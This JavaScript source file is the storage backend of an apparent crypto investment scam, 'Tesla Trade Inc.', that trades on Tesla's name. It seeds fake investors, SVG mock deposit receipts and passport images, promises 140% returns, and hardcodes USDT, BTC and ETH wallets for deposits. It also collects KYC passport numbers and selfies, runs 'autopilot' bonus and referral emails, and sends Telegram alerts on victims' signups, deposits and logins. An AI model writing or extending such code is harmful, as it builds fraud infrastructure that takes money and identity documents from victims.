/**
 * Unified Data Persistence & Cloud Synchronization Engine for Tesla Trade Inc.
 * 
 * Ensures that all investor signups, payments, settings, and logs:
 * 1. Store directly in MySQL when reachable (with auto-migrated tables).
 * 2. Sync to Supabase Cloud Storage (bypassing RLS with SUPABASE_SECRET_KEY in Vercel).
 * 3. Persist to local JSON storage cache (/tmp/tesla_app_state.json and .data/tesla_app_state.json).
 * 4. Maintain zero-latency in-memory state so serverless cold boots never lose data.
 */

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { getDbConnection } from './dbcheck.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Local file cache paths
const TMP_FILE = '/tmp/tesla_app_state.json';
const LOCAL_DIR = path.resolve(__dirname, '../.data');
const LOCAL_FILE = path.join(LOCAL_DIR, 'tesla_app_state.json');

// Default initial state
const DEFAULT_STATE = {
  investors: [
    { id: 1, name: 'David Vance', email: 'david.vance@teslawealths.org', phone: '+1 415-829-1002', onboarding_status: 'verified', registered_at: '2026-09-28 14:22:10' },
    { id: 2, name: 'Elena Rostova', email: 'elena.rostova@gmail.com', phone: '+44 20 7946 0912', onboarding_status: 'active', registered_at: '2026-09-30 09:15:44' },
    { id: 3, name: 'Marcus Sterling', email: 'm.sterling@sterlingcapital.com', phone: '+1 212-555-0198', onboarding_status: 'verified', registered_at: '2026-10-02 18:40:02' },
    { id: 4, name: 'Chloe Dubois', email: 'chloe.dubois@outlook.com', phone: '+33 1 42 68 55 00', onboarding_status: 'active', registered_at: '2026-10-05 11:20:30' }
  ],
  investments: [
    {
      id: 101,
      user_email: 'david.vance@teslawealths.org',
      user_name: 'David Vance',
      plan_id: 'elite_ai',
      plan_name: 'Visionary',
      plan_label: 'Visionary Tier',
      total: 15000,
      total_current_value: 21000,
      projected_roi: 140,
      method: 'USDT (TRC-20)',
      payment_reference: 'TX8928374920194827',
      payment_proof_path: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" viewBox="0 0 400 200"><rect width="400" height="200" fill="%23111"/><text x="20" y="50" fill="%23fff" font-family="sans-serif" font-size="16">Deposit Receipt: USDT Transfer</text><text x="20" y="90" fill="%2322c55e" font-family="sans-serif" font-size="20">$15,000.00 confirmed</text><text x="20" y="130" fill="%23888" font-family="sans-serif" font-size="12">TX: TX8928374920194827</text></svg>',
      status: 'active',
      created_at: '2026-09-28 15:00:00'
    },
    {
      id: 102,
      user_email: 'elena.rostova@gmail.com',
      user_name: 'Elena Rostova',
      plan_id: 'growth_ai',
      plan_name: 'Pioneer',
      plan_label: 'Pioneer Tier',
      total: 5000,
      total_current_value: 5000,
      projected_roi: 100,
      method: 'Bitcoin (BTC)',
      payment_reference: 'BTC-9928172635',
      payment_proof_path: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" viewBox="0 0 400 200"><rect width="400" height="200" fill="%23111"/><text x="20" y="50" fill="%23fff" font-family="sans-serif" font-size="16">Deposit Receipt: BTC Transfer</text><text x="20" y="90" fill="%2322c55e" font-family="sans-serif" font-size="20">$5,000.00 submitted</text><text x="20" y="130" fill="%23888" font-family="sans-serif" font-size="12">Ref: BTC-9928172635</text></svg>',
      status: 'pending_approval',
      created_at: '2026-09-30 09:30:00'
    }
  ],
  kyc: [
    {
      id: 201,
      user_email: 'david.vance@teslawealths.org',
      full_name: 'David Vance',
      id_type: 'Passport',
      id_number: 'P98217281',
      address: '742 Evergreen Terrace, San Francisco, CA',
      id_document_path: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="220" viewBox="0 0 400 220"><rect width="400" height="220" fill="%23181818"/><text x="20" y="50" fill="%23fff" font-family="sans-serif" font-size="18">Government Passport: David Vance</text><text x="20" y="100" fill="%2322c55e" font-family="sans-serif" font-size="14">ID: P98217281 · Verified</text></svg>',
      selfie_path: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="220" viewBox="0 0 400 220"><rect width="400" height="220" fill="%23181818"/><text x="20" y="50" fill="%23fff" font-family="sans-serif" font-size="18">Investor Verification Selfie</text><text x="20" y="100" fill="%2322c55e" font-family="sans-serif" font-size="14">Match Confidence: 99.4%</text></svg>',
      status: 'approved',
      created_at: '2026-09-28 14:30:00'
    }
  ],
  orders: [
    {
      id: 301,
      customer_name: 'Elena Rostova',
      customer_email: 'elena.rostova@gmail.com',
      payment_method: 'USDT (TRC-20)',
      payment_reference: 'EV-ORD-8827',
      payment_proof_path: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200" viewBox="0 0 400 200"><rect width="400" height="200" fill="%23111"/><text x="20" y="50" fill="%23fff" font-family="sans-serif" font-size="16">Order Payment: Tesla Wall Connector</text><text x="20" y="90" fill="%2322c55e" font-family="sans-serif" font-size="20">$475.00 confirmed</text></svg>',
      status: 'approved',
      created_at: '2026-10-01 11:00:00'
    }
  ],
  withdrawals: [],
  financing: [],
  codes: [
    { id: 1, code: 'TT-2026-VIP', status: 'active', source: 'admin', created_at: '2026-09-25 10:00:00' },
    { id: 2, code: 'TESLA-TRADE-2026', status: 'active', source: 'admin', created_at: '2026-09-25 10:00:00' }
  ],
  clicks: [
    { id: 1, created_at: '2026-10-19 14:10:00', campaign_source: 'twitter', landing_page: '/', device_type: 'mobile', referrer: 'https://t.co', ip_address: '172.56.21.9' },
    { id: 2, created_at: '2026-10-19 15:30:00', campaign_source: 'telegram', landing_page: '/invest', device_type: 'desktop', referrer: 'https://t.me', ip_address: '198.51.100.42' }
  ],
  marketingLogs: [
    { id: 1, user_email: 'chloe.dubois@outlook.com', campaign_type: 'no_deposit', subject: '⚡ Activate Your 100% First Deposit Match — Tesla Trade Institutional Portfolios', status: 'sent (sandbox)', resend_id: 'sim_mk_101', created_at: '2026-10-18 10:14:22' },
    { id: 2, user_email: 'david.vance@teslawealths.org', campaign_type: 'referral_share', subject: '💰 Earn 10% Instant Cash Commissions + VIP Referral Bonuses', status: 'delivered', resend_id: 'sim_mk_102', created_at: '2026-10-17 14:02:11' }
  ],
  activityLogs: [
    {
      id: 'log_init_1',
      action: 'SYSTEM_STARTUP',
      category: 'system',
      user_email: 'system',
      ip_address: '127.0.0.1',
      user_agent: 'Server Engine',
      status: 'success',
      details: 'Tesla Trade Inc persistent storage engine initialized.',
      created_at: new Date().toISOString()
    }
  ],
  settings: {
    autopilot_marketing_enabled: 'true',
    autopilot_interval: '24h',
    marketing_last_run: '2026-10-19 12:00:00',
    wallet_usdt: 'TQn9Y2khEsLJW1ChVWFMSMeSTow5KaxnSE',
    wallet_btc: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq',
    wallet_eth: '0x71C8F0dF42250c609c1B95B1d141e4B516e889F6',
    telegram_bot_token: '',
    telegram_chat_id: '',
    telegram_enabled: 'true',
    telegram_notify_signups: 'true',
    telegram_notify_deposits: 'true',
    telegram_notify_approvals: 'true',
    telegram_notify_clicks: 'true',
    telegram_notify_logins: 'true',
    resend_api_key: '',
    resend_from_email: '',
    db_host: '',
    db_port: '',
    db_user: '',
    db_password: '',
    db_name: '',
    database_url: ''
  }
};

// Global in-memory instance
let memoryState = null;
let lastSupabaseSync = 0;

/**
 * Load state from local disk cache if available.
 */
function readLocalFileState() {
  try {
    if (fs.existsSync(LOCAL_FILE)) {
      const data = fs.readFileSync(LOCAL_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {}

  try {
    if (fs.existsSync(TMP_FILE)) {
      const data = fs.readFileSync(TMP_FILE, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {}

  return null;
}

/**
 * Save state to local disk cache.
 */
function writeLocalFileState(state) {
  try {
    if (!fs.existsSync(LOCAL_DIR)) {
      fs.mkdirSync(LOCAL_DIR, { recursive: true });
    }
    fs.writeFileSync(LOCAL_FILE, JSON.stringify(state, null, 2), 'utf8');
  } catch (e) {}

  try {
    fs.writeFileSync(TMP_FILE, JSON.stringify(state, null, 2), 'utf8');
  } catch (e) {}
}

/**
 * Resolve Supabase Cloud Storage bucket and credentials.
 */
function getSupabaseConfig() {
  const url = (process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL || '').replace(/\/$/, '');
  const secretKey = process.env.SUPABASE_SECRET_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_KEY || '';
  return { url, secretKey, hasConfig: !!(url && secretKey) };
}

/**
 * Sync state to/from Supabase Storage bucket.
 */
async function syncWithSupabase(direction = 'pull') {
  const { url, secretKey, hasConfig } = getSupabaseConfig();
  if (!hasConfig) return null;

  const bucketName = 'tesla-data';
  const fileName = 'app_state.json';
  const headers = {
    'apikey': secretKey,
    'Authorization': `Bearer ${secretKey}`,
    'Content-Type': 'application/json'
  };

  try {
    if (direction === 'pull') {
      const res = await fetch(`${url}/storage/v1/object/${bucketName}/${fileName}`, {
        headers,
        cache: 'no-store'
      });
      if (res.ok) {
        const cloudState = await res.json();
        if (cloudState && typeof cloudState === 'object') {
          return cloudState;
        }
      }
    } else if (direction === 'push' && memoryState) {
      // Ensure bucket exists first
      await fetch(`${url}/storage/v1/bucket`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ id: bucketName, name: bucketName, public: false })
      }).catch(() => {});

      // Upload or update object
      await fetch(`${url}/storage/v1/object/${bucketName}/${fileName}`, {
        method: 'POST',
        headers: {
          ...headers,
          'x-upsert': 'true'
        },
        body: JSON.stringify(memoryState)
      }).catch(() => {});
    }
  } catch (e) {
    // Non-fatal cloud sync failure
  }
  return null;
}

/**
 * Auto-migrate MySQL tables so schema is always ready.
 */
export async function ensureMysqlTables(conn) {
  if (!conn) return;
  try {
    await conn.query(`
      CREATE TABLE IF NOT EXISTS investor_accounts (
        id INT AUTO_INCREMENT PRIMARY KEY,
        email VARCHAR(255) NOT NULL UNIQUE,
        name VARCHAR(255) NOT NULL,
        phone VARCHAR(50) DEFAULT '',
        age INT DEFAULT 0,
        onboarding_status VARCHAR(50) DEFAULT 'active',
        invitation_code VARCHAR(50) DEFAULT '',
        registered_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_email (email)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await conn.query(`
      CREATE TABLE IF NOT EXISTS investments (
        id VARCHAR(100) PRIMARY KEY,
        tx_id VARCHAR(100) DEFAULT '',
        user_id VARCHAR(255) DEFAULT '',
        user_name VARCHAR(255) DEFAULT 'Investor',
        user_email VARCHAR(255) NOT NULL,
        portfolio VARCHAR(255) DEFAULT '',
        total DECIMAL(15, 2) DEFAULT 0.00,
        total_current_value DECIMAL(15, 2) DEFAULT 0.00,
        projected_roi DECIMAL(8, 2) DEFAULT 50.00,
        earnings DECIMAL(15, 2) DEFAULT 0.00,
        method VARCHAR(100) DEFAULT 'Crypto',
        status VARCHAR(50) DEFAULT 'pending_approval',
        plan_id VARCHAR(100) DEFAULT 'starter_ai',
        plan_name VARCHAR(255) DEFAULT 'Investment Portfolio',
        payment_confirmed TINYINT(1) DEFAULT 1,
        payment_reference VARCHAR(255) DEFAULT '',
        payment_proof_path LONGTEXT,
        payment_proof_name VARCHAR(255) DEFAULT '',
        payment_proof_uploaded_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        payment_submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        pending_approval_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user_email (user_email),
        INDEX idx_status (status)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await conn.query(`
      CREATE TABLE IF NOT EXISTS account_transactions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_email VARCHAR(255) NOT NULL,
        transaction_type VARCHAR(50) NOT NULL,
        amount DECIMAL(15, 2) NOT NULL,
        status VARCHAR(50) DEFAULT 'processed',
        description VARCHAR(255) DEFAULT '',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user_tx (user_email)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await conn.query(`
      CREATE TABLE IF NOT EXISTS app_settings (
        \`key\` VARCHAR(100) PRIMARY KEY,
        \`value\` LONGTEXT NOT NULL,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await conn.query(`
      CREATE TABLE IF NOT EXISTS activity_logs (
        id VARCHAR(100) PRIMARY KEY,
        action VARCHAR(100) NOT NULL,
        category VARCHAR(50) DEFAULT 'system',
        user_email VARCHAR(255) DEFAULT 'visitor',
        ip_address VARCHAR(100) DEFAULT '',
        user_agent VARCHAR(500) DEFAULT '',
        status VARCHAR(50) DEFAULT 'success',
        details TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_action (action),
        INDEX idx_user (user_email),
        INDEX idx_created (created_at)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);

    await conn.query(`
      CREATE TABLE IF NOT EXISTS analytics_clicks (
        id INT AUTO_INCREMENT PRIMARY KEY,
        ip_address VARCHAR(100) DEFAULT '',
        referrer VARCHAR(500) DEFAULT '',
        landing_page VARCHAR(255) DEFAULT '/',
        campaign_source VARCHAR(100) DEFAULT '',
        device_type VARCHAR(50) DEFAULT 'desktop',
        user_agent VARCHAR(500) DEFAULT '',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    `);
  } catch (e) {
    console.warn('[Store] MySQL auto-migration warning:', e.message);
  }
}

/**
 * Initialize and hydrate state across all tiers.
 */
export async function getStore() {
  if (memoryState) return memoryState;

  // 1. Try local file cache
  const local = readLocalFileState();
  if (local) {
    memoryState = { ...DEFAULT_STATE, ...local };
  } else {
    memoryState = JSON.parse(JSON.stringify(DEFAULT_STATE));
  }

  // 2. Try Supabase cloud sync
  try {
    const cloud = await syncWithSupabase('pull');
    if (cloud) {
      // Merge cloud state (prefer newer arrays)
      if (Array.isArray(cloud.investors) && cloud.investors.length > 0) {
        for (const ci of cloud.investors) {
          if (!memoryState.investors.some(u => (u.email || '').toLowerCase() === (ci.email || '').toLowerCase())) {
            memoryState.investors.unshift(ci);
          }
        }
      }
      if (Array.isArray(cloud.investments) && cloud.investments.length > 0) {
        for (const cinv of cloud.investments) {
          const existingIdx = memoryState.investments.findIndex(i => String(i.id) === String(cinv.id));
          if (existingIdx >= 0) {
            memoryState.investments[existingIdx] = { ...memoryState.investments[existingIdx], ...cinv };
          } else {
            memoryState.investments.unshift(cinv);
          }
        }
      }
      if (cloud.settings && typeof cloud.settings === 'object') {
        memoryState.settings = { ...memoryState.settings, ...cloud.settings };
      }
      if (Array.isArray(cloud.activityLogs)) {
        memoryState.activityLogs = cloud.activityLogs;
      }
    }
  } catch (e) {}

  // 3. Try MySQL hydration if available
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);

    const [dbInvestors] = await conn.query('SELECT * FROM investor_accounts ORDER BY registered_at DESC');
    if (Array.isArray(dbInvestors) && dbInvestors.length > 0) {
      for (const dbi of dbInvestors) {
        const idx = memoryState.investors.findIndex(u => (u.email || '').toLowerCase() === (dbi.email || '').toLowerCase());
        if (idx >= 0) {
          memoryState.investors[idx] = { ...memoryState.investors[idx], ...dbi };
        } else {
          memoryState.investors.unshift(dbi);
        }
      }
    }

    const [dbInvestments] = await conn.query('SELECT * FROM investments ORDER BY id DESC');
    if (Array.isArray(dbInvestments) && dbInvestments.length > 0) {
      for (const dbinv of dbInvestments) {
        const idx = memoryState.investments.findIndex(i => String(i.id) === String(dbinv.id));
        if (idx >= 0) {
          memoryState.investments[idx] = { ...memoryState.investments[idx], ...dbinv };
        } else {
          memoryState.investments.unshift(dbinv);
        }
      }
    }

    const [dbSettings] = await conn.query('SELECT `key`, `value` FROM app_settings');
    if (Array.isArray(dbSettings)) {
      for (const s of dbSettings) {
        memoryState.settings[s.key] = s.value;
      }
    }

    await conn.end();
  } catch (dbErr) {
    // MySQL not reachable - persistent engine continues on Cloud & Local tiers
  }

  writeLocalFileState(memoryState);
  return memoryState;
}

/**
 * Commit in-memory changes across all storage tiers.
 */
export async function persistState() {
  if (!memoryState) return;
  writeLocalFileState(memoryState);

  // Throttled background cloud sync (at most every 2 seconds)
  const now = Date.now();
  if (now - lastSupabaseSync > 2000) {
    lastSupabaseSync = now;
    syncWithSupabase('push').catch(() => {});
  }
}

// ── INVESTORS API ────────────────────────────────────────────────────────

export async function getPersistentInvestors() {
  const store = await getStore();
  return store.investors || [];
}

export async function savePersistentInvestor(account) {
  const store = await getStore();
  const email = String(account.email || '').trim().toLowerCase();
  if (!email) return;

  const existingIdx = store.investors.findIndex(u => (u.email || '').toLowerCase() === email);
  const nowStr = new Date().toISOString().replace('T', ' ').substring(0, 19);

  const updatedRecord = {
    id: existingIdx >= 0 ? store.investors[existingIdx].id : 'inv_' + Date.now(),
    email,
    name: account.name || (existingIdx >= 0 ? store.investors[existingIdx].name : email.split('@')[0]),
    phone: account.phone !== undefined ? account.phone : (existingIdx >= 0 ? store.investors[existingIdx].phone : ''),
    age: account.age !== undefined ? account.age : (existingIdx >= 0 ? store.investors[existingIdx].age : 0),
    onboarding_status: account.onboarding_status || (existingIdx >= 0 ? store.investors[existingIdx].onboarding_status : 'plan_selection'),
    invitation_code: account.invitationCode || account.invitation_code || '',
    registered_at: existingIdx >= 0 ? store.investors[existingIdx].registered_at : nowStr,
    updated_at: nowStr
  };

  if (existingIdx >= 0) {
    store.investors[existingIdx] = updatedRecord;
  } else {
    store.investors.unshift(updatedRecord);
  }

  await persistState();

  // Also sync to MySQL in background
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    await conn.query(
      `INSERT INTO investor_accounts (email, name, phone, age, onboarding_status, invitation_code, registered_at)
       VALUES (?, ?, ?, ?, ?, ?, NOW())
       ON DUPLICATE KEY UPDATE name=VALUES(name),
         phone=IF(VALUES(phone)='', phone, VALUES(phone)),
         age=IF(VALUES(age)=0, age, VALUES(age)),
         onboarding_status=VALUES(onboarding_status),
         updated_at=NOW()`,
      [email, updatedRecord.name, updatedRecord.phone, updatedRecord.age, updatedRecord.onboarding_status, updatedRecord.invitation_code]
    );
    await conn.end();
  } catch (e) {}

  return updatedRecord;
}

// ── INVESTMENTS / DEPOSITS API ──────────────────────────────────────────

export async function getPersistentInvestments() {
  const store = await getStore();
  const list = [...(store.investments || [])];

  // Always keep pending_approval deposits on top for admin visibility
  list.sort((a, b) => {
    if (a.status === 'pending_approval' && b.status !== 'pending_approval') return -1;
    if (b.status === 'pending_approval' && a.status !== 'pending_approval') return 1;
    return new Date(b.created_at || 0).getTime() - new Date(a.created_at || 0).getTime();
  });

  return list;
}

export async function savePersistentInvestment(deposit) {
  const store = await getStore();
  const id = deposit.id || ('dep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6));

  const existingIdx = store.investments.findIndex(i => String(i.id) === String(id));
  const record = {
    ...deposit,
    id,
    created_at: deposit.created_at || new Date().toISOString()
  };

  if (existingIdx >= 0) {
    store.investments[existingIdx] = { ...store.investments[existingIdx], ...record };
  } else {
    store.investments.unshift(record);
  }

  // Ensure investor account status updates
  if (deposit.user_email) {
    const em = deposit.user_email.toLowerCase();
    const invIdx = store.investors.findIndex(u => (u.email || '').toLowerCase() === em);
    if (invIdx >= 0) {
      if (store.investors[invIdx].onboarding_status !== 'active') {
        store.investors[invIdx].onboarding_status = deposit.status === 'active' ? 'active' : 'pending_approval';
      }
    } else {
      store.investors.unshift({
        id: 'u_' + Date.now(),
        email: em,
        name: deposit.user_name || 'Investor',
        phone: '—',
        onboarding_status: deposit.status === 'active' ? 'active' : 'pending_approval',
        registered_at: new Date().toISOString()
      });
    }
  }

  await persistState();

  // Sync to MySQL in background
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    await conn.query(
      `INSERT INTO investments (
        id, tx_id, user_id, user_name, user_email, portfolio,
        total, total_current_value, method, status,
        plan_id, plan_name, projected_roi, payment_confirmed,
        payment_reference, payment_proof_path, payment_proof_name,
        payment_proof_uploaded_at, payment_submitted_at, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, NOW(), NOW(), NOW())
      ON DUPLICATE KEY UPDATE
        total=VALUES(total), total_current_value=VALUES(total_current_value),
        status=VALUES(status), payment_reference=VALUES(payment_reference),
        payment_proof_path=IF(VALUES(payment_proof_path) IS NOT NULL, VALUES(payment_proof_path), payment_proof_path)`,
      [
        id,
        deposit.tx_id || ('tx_' + Date.now()),
        deposit.user_email,
        deposit.user_name || 'Investor',
        deposit.user_email,
        deposit.plan_name || deposit.plan_label || 'Investment Plan',
        parseFloat(deposit.total || '0'),
        parseFloat(deposit.total_current_value || deposit.total || '0'),
        deposit.method || 'Crypto',
        deposit.status || 'pending_approval',
        deposit.plan_id || 'starter_ai',
        deposit.plan_name || 'Investment Plan',
        50.00,
        deposit.payment_reference || '',
        deposit.payment_proof_path || null,
        deposit.payment_proof_name || 'receipt.jpg'
      ]
    );
    await conn.end();
  } catch (e) {}

  return record;
}

export async function updatePersistentInvestmentStatus(id, newStatus) {
  const store = await getStore();
  const inv = store.investments.find(i => String(i.id) === String(id));
  if (!inv) return null;

  inv.status = newStatus;
  if (newStatus === 'active') {
    inv.approved_at = new Date().toISOString();
    inv.payment_confirmed = 1;
    // Mark investor as active
    const email = (inv.user_email || '').toLowerCase();
    const user = store.investors.find(u => (u.email || '').toLowerCase() === email);
    if (user) user.onboarding_status = 'active';
  } else if (newStatus === 'declined') {
    inv.declined_at = new Date().toISOString();
  }

  await persistState();

  // Sync to MySQL in background
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    await conn.query('UPDATE investments SET status=? WHERE id=?', [newStatus, id]);
    if (newStatus === 'active') {
      await conn.query('UPDATE investor_accounts SET onboarding_status="active" WHERE LOWER(email)=?', [(inv.user_email || '').toLowerCase()]);
    }
    await conn.end();
  } catch (e) {}

  return inv;
}

// ── SETTINGS API ─────────────────────────────────────────────────────────

export async function getPersistentSettings() {
  const store = await getStore();
  return store.settings || {};
}

export async function savePersistentSettings(newSettings) {
  const store = await getStore();
  store.settings = { ...store.settings, ...newSettings };
  await persistState();

  // Sync to MySQL
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    for (const [k, v] of Object.entries(newSettings)) {
      await conn.query('INSERT INTO app_settings (\`key\`, \`value\`) VALUES (?, ?) ON DUPLICATE KEY UPDATE \`value\`=?', [k, String(v), String(v)]);
    }
    await conn.end();
  } catch (e) {}

  return store.settings;
}

// ── ACTIVITY LOGS API ───────────────────────────────────────────────────

export async function getPersistentLogs() {
  const store = await getStore();
  return store.activityLogs || [];
}

export async function addPersistentLog(entry) {
  const store = await getStore();
  if (!Array.isArray(store.activityLogs)) store.activityLogs = [];
  store.activityLogs.unshift(entry);
  if (store.activityLogs.length > 500) {
    store.activityLogs = store.activityLogs.slice(0, 500);
  }
  await persistState();

  // Sync to MySQL in background
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    await conn.query(
      'INSERT INTO activity_logs (id, action, category, user_email, ip_address, user_agent, status, details, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, NOW())',
      [entry.id, entry.action, entry.category, entry.user_email, entry.ip_address, entry.user_agent, entry.status, entry.details]
    );
    await conn.end();
  } catch (e) {}

  return entry;
}

export async function clearPersistentLogs() {
  const store = await getStore();
  store.activityLogs = [];
  await persistState();
  try {
    const conn = await getDbConnection();
    await conn.query('TRUNCATE TABLE activity_logs');
    await conn.end();
  } catch (e) {}
}

// ── CLICKS / ANALYTICS API ──────────────────────────────────────────────

export async function getPersistentClicks() {
  const store = await getStore();
  return store.clicks || [];
}

export async function addPersistentClick(click) {
  const store = await getStore();
  if (!Array.isArray(store.clicks)) store.clicks = [];
  const entry = {
    id: store.clicks.length + 1,
    created_at: new Date().toISOString().replace('T', ' ').substring(0, 19),
    ...click
  };
  store.clicks.unshift(entry);
  if (store.clicks.length > 200) {
    store.clicks = store.clicks.slice(0, 200);
  }
  await persistState();

  // Sync to MySQL in background
  try {
    const conn = await getDbConnection();
    await ensureMysqlTables(conn);
    await conn.query(
      'INSERT INTO analytics_clicks (ip_address, referrer, landing_page, campaign_source, device_type, user_agent) VALUES (?, ?, ?, ?, ?, ?)',
      [entry.ip_address || '', entry.referrer || '', entry.landing_page || '/', entry.campaign_source || '', entry.device_type || 'desktop', entry.user_agent || '']
    );
    await conn.end();
  } catch (e) {}

  return entry;
}
